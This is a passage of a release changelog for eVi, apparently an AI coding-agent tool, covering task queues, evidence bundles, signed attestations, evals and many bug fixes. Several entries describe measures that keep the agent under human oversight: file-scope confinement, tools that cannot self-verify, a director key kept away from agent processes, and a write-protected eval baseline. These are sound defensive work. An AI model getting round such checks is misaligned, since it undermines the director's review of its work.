  A crashed start doesn't strand its task: the next start on the same
  machine takes over the worktree lock the dead one left (the lock reason is
  now `eVi isolated run (pid N on HOST)`). Each start also leaves an
  evidence bundle that the verdict signs, and an MCP client can drive the
  queue (both below). See docs/features/tasks.md.
- **`search_fixes` finds eVi's earlier fixes in a fresh checkout, and the
  task queue is shared through git.** The bug-fix ledger
  (`.evi/bug-ledger.jsonl`, which `record_fix` writes) was ignored by git,
  so what one session learned stayed on that machine. It is now tracked,
  `record_fix` writes it with LF line endings on every platform, and it
  starts with the 10 fixes from the 1.0.50 adversarial review that the
  1.0.50 release commit documents. eVi's own `.gitignore` now ignores
  `.evi/*` but keeps `.evi/tasks/`, `.evi/bug-ledger.jsonl`,
  `.evi/REVIEW.md` and `.evi/review-rules.md` tracked, and `*/**/.evi/`
  keeps an `.evi/` folder below the top level ignored. Another repository
  that tracks its task queue needs the same lines: without them the queue's
  lock file, `.evi/tasks.lock`, shows up in `git status`. See "Where the
  files live" in docs/features/tasks.md.
- **Every task run leaves an evidence bundle, and your signature covers
  it.** A review had the model's hand-off and a run report to go on; the
  work itself, the checks' full output and what the model was told had to be
  dug out by hand. `evi task start` now collects a bundle after every run,
  whatever its stop reason, in `~/.evi/evidence/<repo>/<task>/<attempt>/`:
  `diff.patch` and `diffstat.txt` (the commits and uncommitted work against
  the task's base, new files included), eVi's own run of the required checks
  (each one's output; a pytest check also writes its junit report there,
  whose totals sit next to the counts pytest printed), a redacted excerpt of
  the run's transcript (its last 60 messages) and `report.json`, which
  validates against a JSON Schema (`evi.evidence.SCHEMA`). Everything is
  redacted before it is cut, a junit report as the XML it is. The checks run
  only in a trusted repository, without your API keys in their environment,
  not at all for a run that stopped before its checks, and a Ctrl+C stops
  them. The task records the bundle's path and an `evidence_summary` (its
  hash, files and lines changed, checks passed and failed, junit totals),
  which `evi task show` prints. `evi task submit` collects the bundle again
  from the work you committed, and `evi task verify` signs its hash and
  refuses (exit 2) a bundle that changed since it was collected, or a task
  base that isn't an ancestor of the branch head or is the head itself. A
  plain run gets one with `evi run --evidence DIR` (a folder a bundle can't
  go in is a usage error before anything runs), and
  `evi evidence collect T1` (or `--worktree PATH --base REF`) collects one
  on demand. Bundles stay until `evi evidence prune [--dry-run]` removes the
  repository's bundles older than `[evidence] keep_days` (30), never one a
  task names, nor a folder you named. The required checks now run again for
  the bundle: twice per start, once more at submit. See
  docs/features/evidence.md.
- **`evi evidence commit-body` writes a task's commit message, and
  `evi stats --provenance` counts eVi's share of the history from what you
  signed.** Who implemented a commit, and whether anyone reviewed it, lived
  in commit messages anyone could write. `evi evidence commit-body T1`
  (`--format json`) prints the subject, why, acceptance criteria, the
  bundle's check results and the files changed, then `Implemented-by: eVi
  (<backend>/<model>)`, `Task:` and `Evidence:` trailers; `Verified-by`,
  `Review-rounds` and `Attestation` come only from a valid "verified"
  attestation at the task branch's current head, and a line of the task's
  text that reads like a trailer is quoted. `evi stats --provenance`
  (`--since DATE`, `--format json`) reads the repository's history: the
  commits, those that say `Implemented-by: eVi`, those whose `Attestation`
  trailer checks under your director key, eVi's share (attested eVi commits
  over all commits) and the review rounds. Each attestation counts once, a
  copy in a later commit as replayed; unsigned claims, self-reported
  `Verified-by` lines and attestations that don't check are listed apart,
  never counted. The trailer is an HMAC, so it checks only where your key is
  (in CI nothing is attested, and the output says why), and the
  `Implemented-by` line itself is not signed. See "Commit messages" and
  "Provenance counts" in docs/features/evidence.md.
- **An MCP client can run the task queue: `evi mcp serve --categories agent`
  files tasks, starts them, follows and steers the runs and collects their
  reports, and nothing it serves can mark a task verified.** Driving the
  queue took a terminal, so the director's own agent (Claude Desktop,
  Claude Code) could chat with eVi but not hand it a task and come back for
  the result. The opt-in `agent` category adds eight tools: `task_create`,
  `task_list`, `task_show`, `task_start`, `run_status`, `run_steer`,
  `run_cancel` and `run_result`. Starts run one at a time, first in first
  out (at most 16 wait), through the same code as `evi task start`: the
  claim, the worktree, the implementer policy, the required checks, the run
  report and the evidence bundle. A run claims its task with a 10-minute
  lease renewed every 2 minutes, so a server that dies lets go soon;
  `[tasks] max_run_minutes` (default 60) cancels a run that takes longer;
  `run_cancel` stops one in its turn or in the checks after it (stop reason
  `interrupted`, the task back to `open`); closing the server cancels the
  running run and drops the queued ones. No tool verifies, rejects, signs or
  reopens a task, an argument a tool doesn't list is refused, and the server
  runs as an agent's process, where the director key isn't read. The
  category is never a default and never in eVi's own tool registry, so no
  eVi agent gets these tools; over `--http` it needs `--token`, on loopback
  too; beside it only `memory`, `calendar` and `web` may be served (see
  Changed); and the web and desktop app's Settings → MCP → Serve refuses it
  (`400`). `--repo DIR` names the repository, and `evi mcp serve-config
  --categories …,agent` adds `--repo` for the repository you run it in. See
  "The agent category" in docs/features/mcp.md.
- **A task run can change only the files the task names, and `evi task
  verify` won't sign work outside them without your reason.** A task's
  `files_in_scope` was advice in the prompt: the implementer could still
  edit any other unprotected file in its worktree. `evi task start` now
  holds the run to it. A `write_file`, `edit_file` or `apply_patch` to any
  other file is denied, and so is an output redirect to one, and `ruff
  format` or a fixing `ruff check` (`--fix`, `--add-noqa`, a `--config` …)
  on one, on a folder, on a wildcard or on no file at all ("name the files
  instead"); the reason tells the model to leave the file and report it as
  a concern in its hand-off. Reading, the tests and the linters still work
  on any file. An entry is a file, a folder, or a glob over the whole path:
  `*` crosses folders, a `**/` also matches no folder, as in a `.gitignore`,
  and `.` covers everything. A task without `files_in_scope` is refused at
  start (exit 2), and `evi task new` warns when you file one. After the
  run, eVi lists what the branch changed outside the scope anyway (a test's
  output file, say) as `out_of_scope` in the task's `last_result` and the
  run report's `task` section, and `evi task show` prints it. `evi task
  verify` works the list out again on the branch it signs and refuses (exit
  2) while it isn't empty, unless `--allow-out-of-scope REASON` records why
  in the signed reviewer notes. `evi run --policy implementer --confine`
  holds a plain run to its `--scope` entries the same way. Tasks also gain
  `hints`, your guidance on how to approach the work, shown after the why in
  the implementer's prompt: `evi task new --hint TEXT` (repeatable), a
  `hints` field in a `--from` file, or `hints` on MCP's `task_create`. See
  "What a task may change" in docs/features/tasks.md and "Confined runs" in
  docs/features/permissions-and-sandbox.md.
- **Eval cases can check what a run did, not only what it answered, and
  each run happens in a throwaway workspace under the implementer policy.**
  A suite could only test the answer text, so a model that edited the wrong
  file, tried a destructive command or never got the tests passing still
  passed. A case can now assert `expect_tools` (a nested list means any one
  of them), `forbid_tools`, `tool_order`, `tool_args` (an argument matching
  a glob or regex, narrowed by `status`, or with `absent = true` "never"),
  `stop_reason`, `command_succeeds` (commands run in the workspace after the
  agent, each checked by the policy first, so a refused one fails the case
  without running), `file_contains` and `diff_touches_only`. They are
  checked against the run report, with arguments matched in full, and a call
  the policy denied counts as called. Each run gets a fresh temporary git
  repository seeded from the case's `files` and `fixture` folder, written
  byte for byte (CRLF stays CRLF), or with `workspace = "repo"` a detached
  worktree of a trusted repository at `HEAD`; either is removed afterwards,
  also on an error or Ctrl+C, and leaves no branch or worktree record. The
  agent gets no hooks, project context or memory, only the case `mode`'s
  tools that the policy allows, `max_turns` turns, and the verify gate of an
  implementer run: the gate now takes a named policy's own answer on whether
  its folder is trusted, so it runs in fixture workspaces too, and each
  report row counts the runs where it was skipped (`verify_skipped`). `runs`
  and `pass_rate` measure a case over N runs, `expected_fail` reports a
  known gap without failing the suite, and `tags` pick cases with `--tag` /
  `--skip-tag`. A key a case doesn't know is an error, so a typo can't pass
  silently. See docs/features/evals.md.
- **`evi eval run` keeps a report of every run, `evi eval compare` diffs
  two, and `--backend fake` checks a suite with no model.** Results lived in
  the terminal, and checking a suite took a model. Each run now writes
  `<eVi home>/evals/reports/<suite>/<UTC time>-<model>.json`, checked
  against a JSON Schema, with a static, script-free HTML page beside it: per
  case the runs, passes, pass rate and threshold, the failures (redacted),
  mean turns and duration and the stop reasons, and the model, backend,
  hardware and eVi version on top. `evi eval run` gains `--backend
  fake|<saved backend>`, `--model`, `--runs`, `--format json`, `--baseline`
  / `--tolerance`, `--tag` / `--skip-tag` and `--repo`, and exits 0 when
  every case that ran passed, 1 when one failed, 2 when nothing ran.
  `evi eval compare A B` (`--tolerance`, `--format json`) marks each case
  same, improved, regressed, missing, skipped or new and exits 1 on a
  regression; either side may be a baseline. `--backend fake` replays each
  case's `fake` script, text and tool-call turns, through the real Agent
  loop, tools and policy; a case without one, or with a judge rubric, is
  skipped, and a script that runs out or calls a tool the run doesn't offer
  fails. Settings → Evals now shows the latest pass rate of each suite per
  model and backend from these reports (`GET /api/evals` returns them as
  `reports`), so a fake run never stands in for a model's real result.
- **eVi's repository carries a qualification suite, and a recorded baseline
  gates behaviour changes.** The prompt, repair and loop work ahead needs a
  check the unit tests can't give: does the reference model still do the
  job. `evals/self/qualification.toml` and its fixtures check that a model
  reads before it edits, finds a definition with search, refuses to wipe a
  folder (any delete it runs or tries, through a shell wrapper or an
  absolute path, fails it; an inspection command the policy refuses
  doesn't), asks when a request is ambiguous, applies a patch with
  `apply_patch`, and keeps CRLF line endings (expected to fail until edit
  recovery lands). `evi eval run self` runs every `evals/self/*.toml` of a
  trusted repository as one suite; an untrusted one's is skipped (exit 2),
  and `evi eval list` (`--repo`) shows which. `evi eval baseline record`
  (`--suite`, `--runs`, default 5, `--backend`, `--model`,
  `--quantization`, `--gpu` / `--vram-gb` / `--cpu` / `--ram-gb` / `--os`,
  `--out`) records the reference model's per-case pass rates with N, the
  quantization and the hardware in `evals/self/baseline.json`; it is
  director tooling and refuses, writing nothing, wherever an eVi agent may
  have started it; a baseline is the whole suite, so it refuses `--tag` /
  `--skip-tag`, and `self/<file>` without `--out`. `evi eval run --baseline
  FILE` then fails a case below the baseline minus `--tolerance` (0.1), an
  expected failure too, and any baseline case that didn't run, also one a
  `--tag` / `--skip-tag` filter left out; `--partial` holds only the cases
  that ran, listing the filtered ones under `baseline.excluded` with a
  warning. It warns when the model or backend differ, and refuses `--backend
  fake` against a real model's baseline. The baseline is write-protected in
  every mode and never granted under the implementer policy, so no agent can move
  the gate it is measured against. See "The qualification suite" in
  docs/features/evals.md and "The eval gate" in docs/self-build.md.
- **`evi models recommend --verify` runs the qualification suite on the
  recommended models you can run, and ranks them.** The recommendation came
  from the catalog alone. With `--verify` (`--suite`, `--runs`, `--backend`,
  `--repo`) it runs the suite on each recommended chat, coder and fast model
  the backend serves now, writes a report per model and ranks them by mean
  case pass rate. It never downloads a model, and exits 1 when none can run.
  The suite lives in eVi's source repository and isn't installed with eVi
  yet, so an installed eVi needs `--repo` pointing at a checkout of eVi or
  `--suite` naming one of your own suites; otherwise it exits 2 and says so.
- **`evi worktree prune` clears away the worktrees you are done with.**
  Worktrees piled up under `.worktrees/` once their branches were merged.
  `evi worktree prune [--into BRANCH] [--dry-run]` removes those that are
  unlocked, on a branch, clean (untracked files count, whatever
  `status.showUntrackedFiles` says), hold no other worktree and are merged
  into `--into` (default: `HEAD` where you run it), and lists every other one
  with the reason it stayed. It never passes `--force`, deletes no branch and
  merges nothing.
- **`scripts/dev-bootstrap --test` runs the tests where it set things up.**
  The bootstrap checked a worktree but left running its tests to you.
  `--test [ARGS]` (`-Test` in PowerShell) runs the venv's
  `python -m pytest -q -p no:cacheprovider ARGS` in the checkout, or in the
  worktree with `--worktree`, once `doctor --dev --strict` passes, and exits
  with pytest's code; a failed check runs no tests. See docs/self-build.md.
- **The `evi-run` GitHub Action says why a run stopped.** A workflow could
  read only the action's stdout. The action now takes a `max_turns` input
  and `format: stream-json`, and has `exit_code`, `stop_reason` and
  `session_id` outputs (the last two from the run report with `format: json`
  or `stream-json`, and only values eVi itself writes, so model text can't
  forge them). The step writes its outputs before it exits with eVi's exit
  code, so a step with `continue-on-error: true` lets the next one branch on
  `stop_reason`. See "CI — the evi-run GitHub Action" in
  docs/features/automation.md.
- **Stop a running turn, from every surface.** The web and desktop chat has
  a **Stop** button next to Send while a turn runs, and an open permission
  prompt has **Stop turn** (`POST /api/session/<id>/cancel`, which answers
  `{"cancelled": true, "busy": false}` once the session is free, or
  `{"cancelled": false, "reason": "not busy", "busy": false}`; a session that
  isn't one of your own live ones is a `404`). In `evi chat`, Ctrl+C during a
  turn stops it and keeps the session; a second Ctrl+C within 2 s quits.
  `evi run` stops on Ctrl+C or SIGINT and
  still prints its result, with `"stop_reason": "interrupted"` in the JSON
  (or the text so far plus a note on stderr), and exits with code 130. A
  stopped turn ends with `Done` reason `interrupted` within about a tenth of
  a second: streamed text is kept and marked as cut off, running commands
  have their process trees killed, calls that never ran are answered
  `(cancelled)`, a pending permission prompt is answered no and nothing more
  is asked, and the `stop` hook fires. A tool that ignores the stop is left
  behind after 2 s; MCP calls and a delegate CLI-agent backend's own process
  run on until their own timeout. `evi run`'s run report also says why a
  finished run stopped (`stop_reason`, see the run report above). See
  "Stopping a turn" in docs/features/steering.md.
- **SDK: stop a turn.** `Agent.cancel(reason)` ends the running turn as above
  and is safe to call from another thread or a signal handler.
  `ToolContext.cancel_token` is set when the turn is stopped; each turn has
  its own, so read it from the call's `ctx`. `chat()` and `continue_chat()`
  start the turn when called, so a cancel sent before the first event still
  ends it, and closing the generator while tools run now stops them (after a
  2 s grace) instead of waiting for them. `run_headless(...,
  cancel_on_sigint=True)` turns a Ctrl+C into the cancel, and
  `HeadlessResult` gains `stop_reason` and `interrupted`.
- **SDK: say what an agent with nobody to ask may do.** `build_agent` takes
  `unattended_policy="deny" | "allow"` (default: `[auto] unattended_policy`).
  `run_subagent` and `run_subagents_parallel` take `tools=`, an exact list
  of tool names, and `unattended_policy=`, and `run_subagent` takes
  `memory=`, the store its memory tools use. `HeadlessResult` gains `policy`.
  A custom `@tool` category, which has no `[tools]` toggle, counts as enabled
  for a subagent. The custom-tool examples in docs/sdk.md and
  examples/python/custom_tool.py now pass `unattended_policy="allow"`; see
  "Permissions" in docs/sdk.md.
- **`evi chat --mode chat|cowork|code`** (`-m`) picks the session's tool
  preset at launch, as `evi run --mode` does; an unknown mode exits 2.
- **`evi doctor --dev`** checks a development checkout: the venv, git
  `safe.directory`, pytest / ruff / Playwright, `pytest --collect-only` and
  line endings. It prints the fix commands and never runs them; `--strict`
  exits non-zero on a failure. Collection runs only for the eVi checkout
  itself (it imports the checkout's `conftest.py`) unless you pass
  `--collect`. `scripts/dev-bootstrap.sh` / `.ps1` set up a dev venv outside
  the checkout and finish with this check; docs/self-build.md walks through
  the loop.
- **`evi lint` checks your permission settings, and `evi doctor` shows the
  protected paths in force.** `evi lint` reads `config.toml`'s own `[auto]`
  section and warns about a malformed rule, a `rules` or `hard_deny` entry
  whose tool-glob matches no tool name, category or configured MCP server, a
  `hard_deny` entry that starts with `allow`, a `destructive_allow` glob the
  guard ignores, a `destructive_disable_rules` id that names no rule, and a
  `protected_paths_remove` entry that removes nothing. `evi doctor`'s new
  `protected paths` check lists every pattern in force and warns when a
  built-in one was removed.
- **Custom tools can tell which session called them.** A tool function that
  declares a `ctx` parameter gets a `ToolContext`: the session id, working
  folder and turn, a multi-user login's data folder, a cancel token, and for
  a subagent the context it was started from. `ctx` stays out of the schema
  the model sees, and a `ctx` the model sends is replaced. Import it with
  `from evi.sdk import ToolContext`. A `Tool` built with a `binder` keeps its
  state per session, `@tool(trust="untrusted")` labels a tool whose output an
  outsider wrote, and `build_agent` takes `user_root`. The name `ctx` is now
  reserved: a plugin or SDK tool whose model argument was called `ctx` gets
  the context in its place, so rename that argument. See "Custom tools" in
  docs/sdk.md.
- **`evi doctor` checks CLI-agent backends and API keys.** For `claude_agent`,
  `codex`, `gemini`, `amp`, `qwen` and `copilot` it checks the CLI is
  installed (and names the install command), that amp is signed in and that
  gemini has an API key or Vertex AI set up. For an HTTP backend it now sends
  `[llm] api_key` and says when the server rejects it.
- **`evi doctor` checks who can reach your web server.** A new `web access`
  check says whether a token gates the server and, for LAN access
  (`bind_lan`) or federation and A2A serving without one, what to do now that
  a server with no token answers only this machine. In multi-user mode it
  warns when logins exist but no owner token is set (then nobody can reach
  the owner-only routes) and names any login the server refuses because its
  name is reserved for the owner.
- **Docs for everything since 1.0.37, and a page on who can reach eVi.** New
  pages cover the managed llama.cpp runtime (docs/features/runtime.md), the
  Telegram channel (channels.md), first run (onboarding.md) and steering
  (steering.md); sessions.md covers `evi sessions import`, and
  docs/configuration.md gains a `[web]` section. docs/security.md explains
  access tokens, LAN, Docker and desktop setups, browser requests,
  permission deadlines and multi-user mode. docs/roadmap.md is now the plan
  from 1.0.53 on, and the README states Python 3.12+ and links the security
  page.

### Fixed
- **A crash or a full disk mid-write no longer leaves a file half-written.**
  `write_file`, `edit_file` and `apply_patch` write through a temp file and
  `os.replace`; the file's mode and line endings are kept, a symlink is
  written through to its target, and a write refused because another
  program has the file open is retried briefly.
- **Editing a CRLF file keeps it CRLF.** `edit_file` and `apply_patch` turned a
  Windows file's line endings into LF and couldn't find text a model echoed
  back with `\r\n`; a slice from `read_file` came back LF. All three now keep
  the file's own line endings (a mixed file is matched as written).
- **Two parallel edits of one file no longer lose one of them.** `write_file`,
  `edit_file` and `apply_patch` take a per-file lock, keyed by the real path
  (a symlink or junction shares it) and dropped once nobody holds it.
- **A disabled plugin contributes no skills or commands**, and a plugin's hook
  count includes every hook event, not only the two tool-call ones.
- **The memory audit after a dream notices a changed body or tags**, not only
  a changed first line.
- **`evi doctor` calls a backend reachable only when `/models` answers 2xx.** A
  404 now warns that `base_url` usually ends in `/v1`, and localhost is
  probed at 127.0.0.1.
- **The verify gate runs the tests next to a changed module** (`pkg/test_x.py`
  or `tests/pkg/test_x.py`), not only `tests/test_x.py`.
- **CLI help keeps a `[section]` name.** Help such as `evi backend use --help`
  read "copies it into )": Rich ate every literal `[llm]`, `[auto]` and the
  like, in twenty commands' help. A test now walks every command.
- **The web UI's session handoff works.** It looked a multi-user login's
  session up in the shared folder (404) and never staged the copy `evi sync`
  carries; it now reads the user's own transcripts and, single-user, stages
  the copy.
- **`evi web-config users add` refuses a login that would share another's data
  folder** (`bob smith` next to `bob_smith`), which locked both out, and
  `evi doctor` flags any already in `users.json`.
- **In a task run, `run_command` waits as long as eVi's own checks do**
  (`[checks] timeout`, 300 s) instead of 60 s, so a slow test file isn't cut
  off; an interactive session keeps 60 s.
- **`run_command` runs in the folder you asked for on a network share.**
  cmd.exe can't start in a UNC folder and quietly ran the command in the
  Windows folder instead. A folder behind a mapped drive now runs through its
  drive letter; elsewhere a single program with plain arguments is started
  directly, and a command that needs cmd.exe is refused with what to do.
- **`python` in `run_command` and in a task's checks is the Python eVi uses.**
  A bare `python` could start a different interpreter (on Windows, the base
  install behind a virtualenv, or whichever is first on PATH), without the
  project's packages. It is now the folder's own virtualenv, else eVi's.
- **`evi task start` lets the implementer run its tests.** Task runs had no
  `run_command` unless `[tools] shell` was on, so the model couldn't run
  the tests the implementer policy allows; they now get Code mode's tools,
  and the policy still decides each call.
- **The verify review gate reviews the right files and blocks only on real
  defects.** Its reviewers read the main checkout instead of the task's
  worktree; they now read the worktree. Each finding is marked `BLOCKING:` or
  `SUGGESTION:`, and only blocking findings, or a reviewer that failed,
  block a verify; a URL such as `http://localhost:1234` no longer counts as a
  `file:line` finding.
- **`apply_patch` can patch a file whose text contains the patch markers.**
  A marker now counts only at the start of a line, so a string holding
  `<<<<<<< SEARCH` no longer splits the patch.
- **A `config.toml` with a mistake in it no longer stops eVi.** A typo or a
  half-finished edit made every start fail (the desktop app crashed at its
  loading screen). eVi now starts on the default settings, the safe baseline,
  and says why: a red banner in the web and desktop app (`/api/health`
  `config_ok`, the reason in the owner's `GET /api/config`) and a warning on
  stderr in the CLI. It won't save over the file until it's fixed, so nothing
  in it is lost: a settings change answers 409, a CLI command that saves exits 1
  with one line. This also applies when the file breaks after eVi loaded it.
- **The desktop app says when its server dies while starting.** Instead of
  spinning on "Starting eVi…", the window shows the exit code, the log's last
  lines and the log's real path (it follows `EVI_HOME`).
- **Scheduled tasks and the Companion run in the desktop app.** The frozen
  sidecar was built without the `scheduler` extra, so the app's server never
  started its scheduler: scheduled tasks, and now the Companion's check-ins and
  morning brief, silently never ran there (the Companion's status says
  `scheduler: false`). `build-sidecar.*` now install and collect APScheduler,
  and `evi-server --check` fails a build without it.
- **A sidecar frozen without the Visual C++ Redistributable reads PDFs.**
  PyInstaller bundles `MSVCP140.dll` (which PyMuPDF needs) only when the build
  machine has it, so a sidecar frozen elsewhere failed to load PDF support on
  PCs without the redistributable. `build-sidecar.*` now fill any missing VC++
  runtime DLL from a Microsoft-signed copy (System32, Python's folder, or the
  one numpy's wheel carries) via `scripts/bundle_vc_runtime.py`, fail when
  there is none, and stage the sidecar only after its `--check` passes.
  `build-sidecar.ps1` also takes `EVI_PYTHON`, like the `.sh` script.
- **Desktop installers built with Rust's GNU toolchain start.** On Windows the
  GNU toolchain (used where the MSVC Build Tools can't be installed) makes
  `evi-desktop.exe` load `WebView2Loader.dll` at startup, and the bundler
  didn't pack it, so the installed app stopped with "WebView2Loader.dll was
  not found". `scripts/build-desktop.*` now stage Microsoft's loader from the
  locked `webview2-com-sys` crate (`scripts/stage_webview2_loader.py`) and
  bundle it next to the exe (`tauri.webview2-gnu.conf.json`); MSVC builds,
  CI's included, are unchanged, and a GNU release build without the overlay
  warns.
- **A workflow step whose reply broke off with an error is reported as
  failed.** A stream cut mid-reply kept its partial text, and `evi workflow
  run` and the web Workflows panel passed that half answer on to the next step
  as if it were the result. Such a step's output is now `ERROR: <error>`, with
  any partial text after it labelled as incomplete.
- **File writes made at the same moment no longer share a checkpoint
  number.** An agent runs up to four tools at once, and two writes could get
  the same `seq` in `~/.evi/checkpoints/journal.jsonl`, so rewinding to it
  undid both. Each write now gets its own. An entry made by an agent's tool
  also records its session, turn and, in multi-user mode, login, plus the
  top-level session and turn for a subagent's write. See "Checkpoints" in
  docs/features/sessions.md.
- **An apostrophe no longer breaks a user slash command.** `/fix don't panic`
  failed with "No closing quotation" (a server error in the web UI); an
  unbalanced quote in the arguments now falls back to splitting on spaces.
- **One unreadable command file no longer breaks the others.** A non-UTF-8
  file in `~/.evi/commands` made `/help` and every user command fail. It is
  now listed as `(unreadable: not UTF-8 text)`, and only that command fails,
  with "can't run `/name`: …".
- **The `evi-run` action's `version` input works.** It built
  `evi-assistant==1.2.3[web,…]`, which pip rejects, so any pinned version
  failed to install.
- **CHANGELOG history repaired.** The lost headers of 1.0.2, 1.0.29, 1.0.31,
  1.0.32 and 1.0.35 are back (their notes had read as part of the next
  release), 0.32.0 has a reconstructed entry, and the dates of 1.0.10, 1.0.13
  and 1.0.43–1.0.46 match their tags.
- **MCP servers with `transport: http` connect again.** eVi passed their
  headers in a way current mcp SDKs reject, so every streamable-HTTP server
  (the default when a `url` is set) failed to connect. The headers now ride on
  the SDK's own HTTP client. A failed connect logs its real cause
  (`HTTP 401 Unauthorized`, `ConnectError: …`) instead of "unhandled errors in
  a TaskGroup" and no longer leaks what it opened, and a timed-out MCP tool
  call is now cancelled on the server too. On mcp 2.x a remote tool's failure
  reached the model as ordinary output; it is now marked `ERROR:` (once, so
  an eVi-served failure no longer reads `ERROR: ERROR: …`), and the tools
  `evi mcp serve` exposes set MCP's error flag when they fail.
- **An unknown key in `config.toml` no longer stops eVi.** A typo, or a
  setting from a newer eVi, made every command fail as it loaded the config.
  It is now ignored with one warning (`eVi: unknown settings in …`) and kept
  in the file. Saving also keeps keys eVi doesn't manage, nested tables and
  dates, and a value with a newline in it (a stop sequence) no longer makes
  the saved file unloadable.
- **The managed runtime's model pick sees your real RAM.** It read a memory
  figure that doesn't exist and always assumed 8 GB, so a bigger CPU-only
  machine was offered a smaller model than it can run. With a GPU it still
  goes by VRAM, now that of the card with the most.
- **`evi worktree remove` never deletes a locked worktree.** On a git older
  than 2.17, which can't remove a worktree itself, eVi deleted the folder
  even when the worktree was locked (`git worktree lock`). It now refuses,
  and it deletes a folder itself only when git answers that it has no
  `worktree remove`.
- **`evi worktree create` keeps its worktrees out of `git add`.** They live in
  `<repo>/.worktrees/`, so `git add -A` in the main checkout staged each one
  as an embedded repository. eVi now adds `/.worktrees/` to the repository's
  `.git/info/exclude` (never its `.gitignore`).
- **File and shell tools work in the folder you chose.** `/cd`,
  `evi chat --cwd` and the web folder chip set the session folder, but tools
  run on their own threads, which never saw it, so they read, wrote and ran
  commands in the folder eVi was started in while permission checks looked
  at the session folder. Every tool call now runs in the session folder, and
  so do the subagents a chat spawns and the agents `/ultra` and workflows
  build after a `/cd`.
- **The `stop` hook fires.** It was set to run after a turn's last event, but
  every front end stops reading at that event, so it never ran. It now fires
  once per completed turn, just before it ends, with the finish reason
  (`stop`, `length`, `max_turns_reached`, or `interrupted` for a turn you
  stopped) in `EVI_HOOK_ARGS_JSON`. A re-roll fires it once; a prompt blocked
  by a hook or guardrail, or a turn that ends in an LLM error, doesn't fire
  it.
- **A follow-up sent as a turn ends is no longer lost.** A follow-up the turn
  never got to apply came back after the turn's `Done` event, which the web
  UI could miss when it arrived in a later read, leaving the message marked
  "queued" and never sent. It now comes back (`Steering` with
  `applied: false`) before `Done`, which is always the last event, and a
  re-roll, which can now take follow-ups, hands them back the same way. Two
  races that lost one are closed too: a new tab's first two requests could
  each build a session, leaving the running turn on one nobody could reach
  (so `/steer` answered "not busy"), and a follow-up sent the instant a turn
  ended could be queued on the finished turn.
- **Restarting the Telegram channel no longer answers a message twice.** The
  poller a **Save & apply** started fetched again the messages the old one
  was still answering. Pollers on one bot token now share their place, an
  update one of them took is skipped by any other, and starting the channel
  stops the poller already running, so two restarts at once leave one.
- **A resumed tool-using session works on strict backends.** Resume gave each
  tool result a made-up id that answered no call, so OpenAI and the servers
  that check the same way (xAI, Groq, OpenRouter, vLLM) rejected every later
  turn. Transcripts now record which call each result answers, and a resume
  pairs them (by position in older transcripts), gives a call with no result
  an `(interrupted)` placeholder and drops a result with no call. Each request
  is also repaired on its way out, so **Delete from here** or **Branch**
  inside a tool round no longer leaves a chat the backend refuses, and
  consecutive user messages (a note and your next message) are joined for
  templates that need user and model turns to alternate. See "History a
  strict backend accepts" in docs/features/sessions.md.
- **A stream that breaks mid-reply no longer crashes the chat.** A dropped
  connection or a server error in the middle of a reply escaped as an
  exception, which ended `evi chat`. The turn now ends with
  `LLM stream failed mid-reply: …`: what arrived is kept, marked
  `(interrupted) The reply was cut off here: …`, a tool call that was cut off
  is not run, and your next message works. If nothing of the reply had
  arrived, the error is `LLM request failed: …` and nothing is added to the
  chat. With the Responses API (`[llm] api = "responses"`), a request that
  fails as it starts now moves on to your fallback models.
- **A tool call with brackets in its arguments no longer garbles or crashes
  the terminal.** The CLI printed tool arguments, results and permission
  prompts as Rich markup, so `[red]` in a file the agent wrote changed the
  colours and a `[/bold]` raised an error that ended `evi chat`. They are now
  printed as plain text, in `evi chat`, `evi recipe run`, `evi review` and
  the voice loop.
- **`/effort max` no longer fails on reasoning models.** For a model that
  takes a reasoning effort (o-series, gpt-5, qwen3, deepseek-r1, …) it sent
  `reasoning_effort: "max"`, a level OpenAI, Ollama and the gpt-oss templates
  don't accept; `/effort max` and `/effort ultracode` now ask for `high`, the
  highest level they share.
- **A chat you edited, re-rolled, cut back or branched comes back as you left
  it.** Edit, Delete from here, Branch and `/reset` changed the chat only in
  memory, and a re-roll logged just the new reply, so after a restart (the
  desktop app reopened) an edited chat came back as the original prompt
  followed by the old and the new reply, a branch came back empty and a reset
  chat came back whole. Each change is now written to the transcript as a
  record (`edit`, `truncate`, `fork_of`) that a revive or resume replays.
  `evi sessions resume`, `continue` and `fork` now rebuild a session the same
  way as the web revive, compactions included, instead of reading back every
  message ever logged. `evi stats`, search, dreaming, fine-tune export and
  `evi sessions show` skip the records. After a quick re-roll the web chat no
  longer draws the new reply twice. See "Transcripts" in
  docs/features/sessions.md.
- **`evi sessions fork` keeps what it copied.** The fork's copy of the
  history was never written to its own transcript, so resuming the fork later
  lost everything before the fork. It now starts with a `fork_of` record.
- **A session that runs past midnight resumes whole.** Its messages are filed
  under the day each was written, and resume, the web revive, export and
  handoff read only one day's file. They now read every day's, in the order
  the lines were written. Retention (`tools.cleanup_period_days`,
  `evi sessions purge`) keeps a session that ran on into a day it keeps whole,
  instead of deleting its first days.
- **Handing a session off to another device works.** `evi sessions handoff`
  said to `evi sync`, but sync leaves transcripts behind, so the other device
  had nothing to resume. Handoff now copies the session to
  `~/.evi/handoff/<id>.jsonl`, which `evi sync` carries (even from a sync repo
  set up before), and `evi sessions resume <id>`, `evi sessions fork <id>` or
  `/?session=<id>` on the other device takes the copy in, adding to a copy it
  already has but never overwriting one that went on differently. The copy
  reaches your sync remote unencrypted. See "Handing a session off to another
  device" in docs/features/sessions.md.
- **A resumed CLI session has the `!cmd` output and `/ultra` exchanges it
  had.** The `evi chat` REPL added a `!cmd`'s output, a `/ultra <task>`
  exchange and an auto-ultracode turn to the history without writing them
  to the transcript, so `evi sessions resume` lost them, and a `/compact`
  made after one replayed its kept messages one off. They are now logged
  (redacted, like every line), so the resumed history is the one you had.
  See "Transcripts" in docs/features/sessions.md.
- **`evi run` prints an answer with a broken emoji instead of failing after
  the run.** A model answer holding a lone surrogate (half an emoji) made
  the text format raise once the run was over, so the answer and the run's
  exit code were lost. Whatever stdout can't encode now goes out escaped
  (`\ud83d`), also on a stdout in Python's UTF-8 mode, where some of them
  used to go out as invalid bytes, and the exit code is the run's.
  `--format json` and `stream-json` were already safe.
- **The Evals panel's Run button runs the suite it shows.** It sent the
  suite's `name` from inside the file, but suites are found by file name, so
  a suite whose `name` differed from its file got `404` or ran another
  file. The button now sends the file name (`GET /api/evals` returns it as
  `file`), and a `~/.evi/evals/self.toml`, which `self` shadows, gets a
  disabled button with a note.

## [1.0.53] — 2026-10-09

A security release. Update promptly, especially if you use the desktop app or
open repos you didn't write.

### Security
- **Another website can no longer write files on your computer through eVi.**
